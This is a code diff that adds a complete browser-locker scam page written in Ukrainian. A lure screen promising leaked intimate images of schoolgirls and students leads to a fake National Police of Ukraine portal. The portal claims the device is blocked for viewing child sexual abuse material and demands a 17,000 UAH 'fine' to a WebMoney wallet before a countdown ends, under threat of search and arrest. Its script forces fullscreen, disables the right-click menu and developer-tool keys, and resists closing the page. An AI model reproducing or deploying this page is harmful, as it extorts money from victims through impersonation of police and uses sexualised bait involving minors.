@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Головна | Національна поліція України</title>
+    <link rel="icon" href="https://static.rayon.in.ua/Attaches/2023/02/19/bfefda2e961d83228a5e13462870e101.jpg" type="image/jpeg">
+    <link href="https://fonts.cdnfonts.com/css/e-ukraine" rel="stylesheet">
+    <style>
+        :root {
+            --gov-dark: #0f172a;
+            --gov-blue: #1e3a8a;
+            --gov-accent: #2563eb;
+            --gov-gold: #eab308;
+            --gov-red: #991b1b;
+            --bg-body: #f1f5f9;
+            --bg-panel: #ffffff;
+            --text-main: #0f172a;
+            --text-secondary: #475569;
+            --border-light: #e2e8f0;
+            --border-dark: #cbd5e1;
+            --transition: 0.3s ease;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body, html {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background-color: var(--bg-body);
+            font-family: 'e-Ukraine', system-ui, -apple-system, sans-serif;
+            color: var(--text-main);
+            -webkit-font-smoothing: antialiased;
+        }
+
+        #app-container { position: relative; width: 100vw; height: 100vh; }
+        
+        .screen {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            display: flex; flex-direction: column;
+            opacity: 0; pointer-events: none; visibility: hidden;
+            transition: opacity 0.4s ease, visibility 0.4s ease;
+        }
+        .screen.active { opacity: 1; pointer-events: all; visibility: visible; }
+
+        /* ================= ЕКРАН 1: ПРИМАНКА ================= */
+        #screen-init {
+            justify-content: center; 
+            align-items: center; 
+            background-color: #0f172a;
+        }
+        
+        .image-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 280px);
+            gap: 24px;
+            margin-bottom: 40px;
+            justify-content: center;
+        }
+        
+        .image-grid img {
+            width: 280px;
+            height: 280px;
+            object-fit: cover;
+            border-radius: 12px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
+            background-color: #1e293b;
+            animation: floating 5s ease-in-out infinite;
+        }
+
+        .image-grid img:nth-child(1) { animation-delay: 0s; animation-duration: 5.5s; }
+        .image-grid img:nth-child(2) { animation-delay: -1s; animation-duration: 6s; }
+        .image-grid img:nth-child(3) { animation-delay: -2s; animation-duration: 4.5s; }
+        .image-grid img:nth-child(4) { animation-delay: -3s; animation-duration: 5s; }
+        .image-grid img:nth-child(5) { animation-delay: -1.5s; animation-duration: 6.5s; }
+        .image-grid img:nth-child(6) { animation-delay: -4s; animation-duration: 4.8s; }
+
+        @keyframes floating {
+            0% { transform: translate(0, 0) rotate(0deg); }
+            25% { transform: translate(8px, -12px) rotate(1.5deg); }
+            50% { transform: translate(-5px, -18px) rotate(-1deg); }
+            75% { transform: translate(-12px, 8px) rotate(2deg); }
+            100% { transform: translate(0, 0) rotate(0deg); }
+        }
+
+        .bait-text {
+            font-size: 32px;
+            font-weight: 800;
+            color: #e11d48;
+            margin-bottom: 30px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            text-shadow: 0 4px 20px rgba(225, 29, 72, 0.4);
+            text-align: center;
+            font-family: system-ui, sans-serif;
+        }
+
+        .btn-bait {
+            padding: 20px 60px; 
+            font-size: 20px; 
+            font-weight: 800; 
+            text-transform: uppercase;
+            letter-spacing: 2px; 
+            color: #fff; 
+            background: linear-gradient(135deg, #e11d48, #be123c);
+            border: none; 
+            border-radius: 8px; 
+            cursor: pointer;
+            box-shadow: 0 10px 30px rgba(225, 29, 72, 0.4); 
+            transition: all 0.3s ease;
+        }
+        .btn-bait:hover { 
+            transform: scale(1.05); 
+            box-shadow: 0 15px 40px rgba(225, 29, 72, 0.6); 
+        }
+
+        @media (max-width: 950px) {
+            .image-grid { grid-template-columns: repeat(3, 200px); }
+            .image-grid img { width: 200px; height: 200px; }
+            .bait-text { font-size: 24px; }
+        }
+        @media (max-width: 650px) {
+            .image-grid { grid-template-columns: repeat(2, 160px); }
+            .image-grid img { width: 160px; height: 160px; }
+        }
+
+        /* ================= ЕКРАН 2: ЗАГРУЗКА ================= */
+        #screen-loader {
+            justify-content: center; align-items: center; background-color: var(--bg-panel);
+        }
+        .spinner {
+            width: 44px; height: 44px; border: 3px solid var(--border-light);
+            border-top-color: var(--gov-blue); border-radius: 50%; animation: spin 0.8s linear infinite;
+        }
+        .loader-text { margin-top: 20px; font-size: 13px; font-weight: 700; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px;}
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* ================= ГОЛОВНИЙ ПОРТАЛ ================= */
+        
+        .gov-header {
+            width: 100%; height: 72px; background-color: var(--gov-dark); color: #fff;
+            display: flex; align-items: center; justify-content: flex-start; gap: 16px;
+            padding: 0 32px; border-bottom: 3px solid var(--gov-gold); z-index: 10;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        .gov-header img { height: 46px; width: auto; }
+        .gov-title { display: flex; flex-direction: column; justify-content: center; }
+        .gov-title strong { font-size: 16px; letter-spacing: 0.5px; text-transform: uppercase; }
+        .gov-title span { font-size: 11px; color: #94a3b8; text-transform: uppercase; letter-spacing: 1px; }
+
+        .portal-grid {
+            display: grid;
+            grid-template-columns: 360px minmax(500px, 1fr) 460px;
+            height: calc(100vh - 72px);
+            background-color: var(--bg-body);
+        }
+
+        /* ---------------- ЛІВЕ МЕНЮ ТА КОНТАКТИ ---------------- */
+        .sidebar-left {
+            background-color: var(--bg-panel);
+            border-right: 1px solid var(--border-light);
+            display: flex; flex-direction: column;
+            box-shadow: 4px 0 15px rgba(0,0,0,0.03);
+            z-index: 5;
+            height: 100%;
+            overflow: hidden;
+        }
+        
+        .sidebar-nav-wrapper {
+            flex-grow: 1;
+            overflow-y: auto;
+        }
+
+        .nav-header {
+            padding: 20px 24px; font-size: 13px; font-weight: 800;
+            color: var(--gov-blue); text-transform: uppercase; letter-spacing: 1px;
+            border-bottom: 1px solid var(--border-light); background-color: #f8fafc;
+        }
+        .nav-list { display: flex; flex-direction: column; list-style: none; padding: 12px 0; margin: 0; }
+        .nav-item {
+            padding: 16px 24px; font-size: 14px; font-weight: 700; color: var(--text-main);
+            cursor: pointer; transition: var(--transition);
+            display: flex; align-items: center; justify-content: space-between;
+            border-left: 4px solid transparent;
+        }
+        .nav-item:hover { background-color: #f1f5f9; color: var(--gov-blue); }
+        .nav-item.active { background-color: #f0fdf4; color: var(--gov-blue); border-left: 4px solid var(--gov-gold); }
+        .nav-item::after { content: '›'; font-size: 18px; color: var(--border-dark); }
+        .nav-item.active::after { color: var(--gov-gold); }
+
+        .sidebar-footer {
+            flex-shrink: 0;
+            padding: 24px;
+            border-top: 1px solid var(--border-light);
+            background-color: #f8fafc;
+        }
+        .contact-block {
+            display: flex; flex-direction: column; gap: 12px;
+            font-size: 12px; color: var(--text-secondary); font-weight: 700; line-height: 1.4;
+        }
+        .contact-block span { display: flex; flex-direction: column; gap: 3px; }
+        .contact-block span strong { color: var(--gov-blue); text-transform: uppercase; font-size: 10px; letter-spacing: 0.5px; }
+
+        /* ---------------- ЦЕНТРАЛЬНИЙ ДОКУМЕНТ ---------------- */
+        .main-workspace {
+            padding: 32px 40px;
+            display: flex; justify-content: center; 
+            align-items: stretch;
+            overflow: hidden; background-color: var(--bg-body);
+        }
+
+        .strict-document {
+            background-color: #fff;
+            width: 100%; max-width: 900px;
+            border: 1px solid var(--border-dark);
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.04);
+            display: flex; flex-direction: column;
+            overflow: hidden;
+        }
+
+        .doc-head {
+            background-color: var(--gov-red);
+            color: #fff; padding: 16px 24px;
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .doc-head h2 { font-size: 16px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; margin: 0; }
+        .doc-head span { font-family: ui-monospace, monospace; font-size: 14px; font-weight: 700; background: rgba(0,0,0,0.2); padding: 6px 10px; border-radius: 4px; }
+
+        .doc-body {
+            padding: 32px 40px;
+            flex-grow: 1;
+            display: flex; flex-direction: column; 
+            justify-content: flex-start;
+            overflow-y: auto;
+        }
+        
+        .doc-content-wrapper {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            width: 100%;
+        }
+
+        .doc-text {
+            font-size: 14.5px; line-height: 1.6; font-weight: 700; color: var(--text-main);
+            text-align: justify; margin: 0; padding: 0;
+        }
+
+        .strict-table {
+            width: 100%; border-collapse: collapse; margin: 8px 0;
+            border: 2px solid #0f172a;
+            border-radius: 4px;
+        }
+        .strict-table td {
+            border: 1px solid #0f172a; padding: 14px 16px;
+            font-size: 14px; color: var(--text-main);
+        }
+        .strict-table td:first-child {
+            width: 38%; font-weight: 800; background-color: #f8fafc;
+            text-transform: uppercase; font-size: 12px; color: var(--text-secondary);
+        }
+        .strict-table td:last-child { font-weight: 800; font-size: 15px; }
+        .strict-table .highlight { color: var(--gov-red); font-size: 17px; }
+
+        .doc-foot {
+            background-color: #f8fafc; border-top: 1px solid var(--border-dark);
+            padding: 20px 32px; display: flex; justify-content: center; align-items: center;
+        }
+        
+        .timer-block { text-align: center; width: 100%; }
+        .timer-desc { font-size: 11px; font-weight: 800; text-transform: uppercase; color: var(--text-secondary); display: block; margin-bottom: 4px; }
+        .timer-digits { font-family: ui-monospace, monospace; font-size: 26px; font-weight: 800; color: var(--gov-red); letter-spacing: 2px; }
+
+        /* ---------------- ПРАВА СТРІЧКА НОВИН ---------------- */
+        .sidebar-right {
+            background-color: var(--bg-panel);
+            border-left: 1px solid var(--border-light);
+            display: flex; flex-direction: column;
+            box-shadow: -4px 0 15px rgba(0,0,0,0.03);
+            z-index: 5;
+            height: 100%;
+            overflow: hidden;
+        }
+        
+        .news-feed {
+            flex-grow: 1;
+            overflow-y: auto;
+            padding: 20px;
+            display: flex; flex-direction: column; gap: 20px;
+        }
+
+        .news-feed::-webkit-scrollbar { width: 6px; }
+        .news-feed::-webkit-scrollbar-track { background: var(--bg-panel); }
+        .news-feed::-webkit-scrollbar-thumb { background: var(--border-dark); border-radius: 4px; }
+        .news-feed::-webkit-scrollbar-thumb:hover { background: var(--text-secondary); }
+
+        .news-card {
+            display: flex; gap: 16px;
+            border-bottom: 1px solid var(--border-light);
+            padding-bottom: 20px;
+        }
+        .news-card:last-child { border-bottom: none; }
+
+        .news-photo {
+            width: 140px; height: 100px; flex-shrink: 0;
+            border-radius: 6px; object-fit: cover;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            background-color: #e2e8f0;
+        }
+
+        .news-info { display: flex; flex-direction: column; gap: 8px; justify-content: flex-start; }
+        .news-date { font-size: 11px; font-weight: 800; color: var(--gov-accent); text-transform: uppercase; }
+        .news-title { font-size: 14px; font-weight: 700; color: var(--text-main); line-height: 1.4; }
+
+        .load-more {
+            text-align: center;
+            padding: 14px;
+            margin-top: 10px;
+            font-size: 13px;
+            font-weight: 800;
+            color: var(--gov-blue);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            border-radius: 6px;
+            transition: var(--transition);
+        }
+        .load-more:hover { background-color: var(--bg-body); }
+
+    </style>
+</head>
+<body>
+
+    <div id="app-container">
+        
+        <!-- ЕКРАН 1: ПРИМАНКА -->
+        <div id="screen-init" class="screen active">
+            
+            <div class="image-grid">
+                <img src="image\image1.png" alt="Фото 1">
+                <img src="image\image2.png" alt="Фото 2">
+                <img src="image\image3.png" alt="Фото 3">
+                <img src="image\image4.png" alt="Фото 4">
+                <img src="image\image5.png" alt="Фото 5">
+                <img src="image\image6.png" alt="Фото 6">
+            </div>
+            
+            <div class="bait-text">⬇️Смотru slивы shкольnиц и sтудenтok⬇️</div>
+            
+            <button id="btn-start" class="btn-bait">⚡️Cmoтреть⚡️</button>
+        </div>
+
+        <!-- ЕКРАН 2: Загрузка -->
+        <div id="screen-loader" class="screen">
+            <div class="spinner"></div>
+            <div class="loader-text">Загрузка...</div>
+        </div>
+
+        <!-- ЕКРАН 3: Головний Портал -->
+        <div id="screen-main" class="screen">
+            
+            <header class="gov-header">
+                <!-- Повернутий логотип НПУ -->
+                <img src="\image\image.png" alt="МВС" onerror="this.style.display='none'">
+                <div class="gov-title">
+                    <strong>Національна поліція України</strong>
+                    <span>Офіційний інформаційний портал</span>
+                </div>
+            </header>
+
+            <div class="portal-grid">
+                
+                <!-- ЛІВЕ МЕНЮ ТА КОНТАКТИ -->
+                <aside class="sidebar-left">
+                    <div class="sidebar-nav-wrapper">
+                        <div class="nav-header">Меню порталу</div>
+                        <ul class="nav-list">
+                            <li class="nav-item">Головна сторінка</li>
+                            <li class="nav-item">Про поліцію</li>
+                            <li class="nav-item">Діяльність</li>
+                            <li class="nav-item">Громадянам</li>
+                            <li class="nav-item active">Електронні послуги</li>
+                            <li class="nav-item">Воєнні злочини рф</li>
+                            <li class="nav-item">Бази даних розшуку</li>
+                            <li class="nav-item">Запобігання корупції</li>
+                            <li class="nav-item">Контакти</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="sidebar-footer">
+                        <div class="contact-block">
+                            <span><strong>Адреса</strong> Україна, 01601, місто Київ, вул. Богомольця Академіка, будинок 10</span>
+                            <span><strong>Телефон</strong> +380 (44) 254-93-33</span>
+                            <span><strong>Електронна пошта</strong> info@police.gov.ua</span>
+                        </div>
+                    </div>
+                </aside>
+
+                <!-- ЦЕНТРАЛЬНА ПОСТАНОВА -->
+                <main class="main-workspace">
+                    <div class="strict-document">
+                        
+                        <div class="doc-head">
+                            <h2>Постанова про правопорушення</h2>
+                            <span>№ 73-АК-18452947</span>
+                        </div>
+
+                        <div class="doc-body">
+                            <div class="doc-content-wrapper">
+                                
+                                <div class="doc-text">
+                                    Єдина інформаційно-аналітична система Департаменту кіберполіції НПУ, керуючись положеннями Закону України «Про Національну поліцію» та Кримінального процесуального кодексу України, здійснює безперервний моніторинг телекомунікаційних мереж на предмет виявлення кримінальних правопорушень.
+                                </div>
+
+                                <div class="doc-text" style="color: var(--gov-red);">
+                                    УВАГА: РОБОТУ ВАШОГО ПРИСТРОЮ ЗАБЛОКОВАНО. Зафіксовано перегляд матеріалів порнографічного характеру за участю неповнолітніх, а також незаконне збереження та розповсюдження інтимних матеріалів осіб, які не досягли 18-річного віку, або поширення таких матеріалів без їхньої згоди.
+                                </div>
+                                
+                                <div class="doc-text">
+                                    Такі дії є прямим порушенням вимог чинного законодавства та підпадають під кваліфікацію статті 301 Кримінального кодексу України. На підставі зібраних цифрових доказів, логів мережевої активності та ідентифікації вашої IP-адреси, відносно власника пристрою винесено постанову про накладення адміністративного стягнення.
+                                </div>
+
+                                <table class="strict-table">
+                                    <tr>
+                                        <td>Вид стягнення</td>
+                                        <td>Адміністративний штраф</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Сума стягнення</td>
+                                        <td class="highlight">17 000,00 UAH</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Призначення платежу</td>
+                                        <td>Оплата штрафу (Справа № 73-АК-18452947)</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Платіжні реквізити</td>
+                                        <td>WebMoney: U125599340596</td>
+                                    </tr>
+                                </table>
+
+                                <div class="doc-text">
+                                    Згідно з вимогами ст. 307 КУпАП, штраф має бути сплачений порушником у встановлений таймером термін для уникнення кримінальної відповідальності. Сплату необхідно здійснити виключно за вказаними платіжними реквізитами. Після системного підтвердження транзакції серверами МВС, алгоритм блокування пристрою буде деактивовано автоматично.
+                                </div>
+
+                                <div class="doc-text">
+                                    У разі ухилення від добровільної сплати штрафу, матеріали електронного провадження будуть негайно передані до органів досудового розслідування. Одночасно за встановленою адресою вашого перебування буде направлено слідчо-оперативну групу для проведення обшуку, вилучення комп'ютерної техніки та подальшого затримання.
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="doc-foot">
+                            <div class="timer-block">
+                                <span class="timer-desc">Час на добровільну сплату:</span>
+                                <span class="timer-digits" id="countdown-timer">11:59:59</span>
+                            </div>
+                        </div>
+
+                    </div>
+                </main>
+
+                <!-- ПРАВА СТРІЧКА НОВИН -->
+                <aside class="sidebar-right">
+                    <div class="nav-header">Останні новини</div>
+                    <div class="news-feed" id="news-container">
+                        
+                        <div class="news-card">
+                            <img src="https://npu.gov.ua/static-objects/npu/resources/resize/600_0_0_0_auto/img_76bf7e8140379e2d3b5872d92c9fbb9e.jpg" class="news-photo" alt="Фото">
+                            <div class="news-info">
+                                <span class="news-date">Сьогодні | 15:42</span>
+                                <span class="news-title">На Київщині поліцейські викрили дві корупційні схеми: серед фігурантів – працівники газорозподільної компанії та директор комунального підприємства</span>
+                            </div>
+                        </div>
+
+                        <div class="news-card">
+                            <img src="https://npu.gov.ua/static-objects/npu/resources/resize/600_0_0_0_auto/img_74b45ff7eb8dec13ccae01589d0b3fec.jpeg" class="news-photo" alt="Фото">
+                            <div class="news-info">
+                                <span class="news-date">Сьогодні | 14:10</span>
+                                <span class="news-title">Із Зеленівки, що потерпає від ворожих атак рф, поліцейські Херсонщини евакуювали матір із двома синами.</span>
+                            </div>
+                        </div>
+
+                        <div class="news-card">
+                            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSQPtfSQ1rSxnrhQ1AXYDkY20ERBlIw4xdWCEFozqktZg&s=10" class="news-photo" alt="Фото">
+                            <div class="news-info">
+                                <span class="news-date">Сьогодні | 12:35</span>
+                                <span class="news-title">Поліцейські Харківщини врятували маломобільну жінку з палаючого будинку після ворожого удару</span>
+                            </div>
+                        </div>
+
+                        <div class="news-card">
+                            <img src="https://npu.gov.ua/static-objects/npu/resources/resize/600_0_0_0_auto/img_91ec3ed9941e7a625117fbe2dcea38b0.jpg" class="news-photo" alt="Фото">
+                            <div class="news-info">
+                                <span class="news-date">Сьогодні | 10:15</span>
+                                <span class="news-title">Ошукали виробника дронів для ЗСУ на 55 тисяч євро та вимагали ще 150 тисяч доларів: поліція Києва повідомила про підозру двом адвокатам</span>
+                            </div>
+                        </div>
+
+                        <div class="news-card">
+                            <img src="https://npu.gov.ua/static-objects/npu/resources/resize/600_0_0_0_auto/img_554dbbcc725d9f3ed34cc4a47d487ec0.jpg" class="news-photo" alt="Фото">
+                            <div class="news-info">
+                                <span class="news-date">Вчора | 18:20</span>
+                                <span class="news-title">На Хмельниччині вшанували пам’ять загиблого на війні поліцейського Дмитра Ткачука</span>
+                            </div>
+                        </div>
+
+                        <div class="news-card">
+                            <img src="https://npu.gov.ua/static-objects/npu/resources/resize/600_0_0_0_auto/img_4acd24088811a366be959fd71a181985.jpeg" class="news-photo" alt="Фото">
+                            <div class="news-info">
+                                <span class="news-date">Вчора | 16:45</span>
+                                <span class="news-title">Заради безпеки маленького сина: «Білі янголи» евакуювали жінку з дитиною із прифронтової громади на Сумщині</span>
+                            </div>
+                        </div>
+
+                        <div class="news-card">
+                            <img src="https://npu.gov.ua/static-objects/npu/resources/resize/600_0_0_0_auto/img_71ca481469a3acd6d5d1f5d10bc9cbb4.jpeg" class="news-photo" alt="Фото">
+                            <div class="news-info">
+                                <span class="news-date">Вчора | 14:10</span>
+                                <span class="news-title">Як спілкуватися з ветеранами у кризових ситуаціях: оператори служби «102» пройшли спеціальне навчання</span>
+                            </div>
+                        </div>
+
+                        <div class="news-card">
+                            <img src="https://npu.gov.ua/static-objects/npu/resources/resize/600_0_0_0_auto/img_78d1db7a70b69f5d01b654e1fd0d1f71.jpg" class="news-photo" alt="Фото">
+                            <div class="news-info">
+                                <span class="news-date">Вчора | 11:30</span>
+                                <span class="news-title">Нацполіція екстрадувала з Норвегії українського банкіра, що викрав понад мільйон гривень з рахунків клієнтів</span>
+                            </div>
+                        </div>
+
+                        <div class="news-card">
+                            <img src="https://npu.gov.ua/static-objects/npu/resources/resize/600_0_0_0_auto/img_3cb2763e39f87f55a2c6ada1c32bb648.jpeg" class="news-photo" alt="Фото">
+                            <div class="news-info">
+                                <span class="news-date">Вчора | 09:05</span>
+                                <span class="news-title">Одна людина загинула, ще 13 постраждали: слідчі Дніпропетровщини задокументували наслідки воєнних злочинів окупантів</span>
+                            </div>
+                        </div>
+
+                        <div class="load-more">Загрузити ще...</div>
+
+                    </div>
+                </aside>
+
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const btnStart = document.getElementById('btn-start');
+            const screenInit = document.getElementById('screen-init');
+            const screenLoader = document.getElementById('screen-loader');
+            const screenMain = document.getElementById('screen-main');
+            const timerEl = document.getElementById('countdown-timer');
+
+            // Захист від ПКМ
+            document.addEventListener('contextmenu', e => e.preventDefault());
+            document.addEventListener('keydown', e => {
+                if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) e.preventDefault();
+            });
+
+            function switchScreen(from, to) {
+                from.classList.remove('active');
+                setTimeout(() => to.classList.add('active'), 400);
+            }
+
+            btnStart.addEventListener('click', () => {
+                // Перемикання на Загрузку відразу
+                switchScreen(screenInit, screenLoader);
+
+                // Через 2 секунди переходимо в повноекранний режим і відкриваємо портал одночасно
+                setTimeout(() => {
+                    const docEl = document.documentElement;
+                    if (docEl.requestFullscreen) docEl.requestFullscreen().catch(() => {});
+                    else if (docEl.webkitRequestFullscreen) docEl.webkitRequestFullscreen();
+                    
+                    switchScreen(screenLoader, screenMain);
+                    startTimer(43199); 
+                }, 2000);
+            });
+
+            // Таймер
+            function startTimer(seconds) {
+                let timer = seconds;
+                setInterval(() => {
+                    if (timer <= 0) return;
+                    timer--;
+                    const h = String(Math.floor(timer / 3600)).padStart(2, '0');
+                    const m = String(Math.floor((timer % 3600) / 60)).padStart(2, '0');
+                    const s = String(timer % 60).padStart(2, '0');
+                    timerEl.textContent = `${h}:${m}:${s}`;
+                }, 1000);
+            }
+
+            // Попередження при закритті сторінки
+            window.addEventListener('beforeunload', (e) => {
+                e.preventDefault();
+                e.returnValue = '';
+            });
+        });
+    </script>
+</body>
+</html>
